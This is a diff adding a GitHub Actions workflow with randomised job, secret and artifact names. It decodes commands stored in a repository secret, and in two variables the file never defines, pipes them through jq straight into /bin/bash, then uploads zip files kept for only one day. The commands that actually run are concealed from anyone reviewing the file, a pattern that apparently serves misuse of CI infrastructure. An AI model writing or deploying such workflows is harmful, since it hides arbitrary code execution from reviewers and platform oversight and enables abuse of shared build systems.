@@ -1,0 +1,23 @@
+name: caddywebsocket356
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: caddywebsocket356
+        env:
+          skev8561: ${{ secrets.skev8561 }}
+        run: |
+          printf '%s' "$skev8561" | jq -r .en20 | /bin/bash
+          printf '%s' "$qqax5" | jq -r .jqaqh20809 | /bin/bash
+          echo $sg3499 | jq -r .bdkdm497 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: OiCmfPkt
+          path: "*.zip"
+          retention-days: 1
